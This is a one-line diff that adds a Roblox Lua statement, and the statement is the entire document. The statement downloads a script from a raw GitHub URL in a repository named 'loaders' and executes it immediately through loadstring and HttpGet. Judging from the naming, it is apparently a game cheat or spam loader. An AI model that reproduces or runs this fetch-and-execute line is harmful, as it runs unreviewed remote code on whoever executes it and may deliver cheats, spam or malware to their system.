@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/7-days-cat-sitting-spam6-fjzd66uhl2c8bp.lua"))()
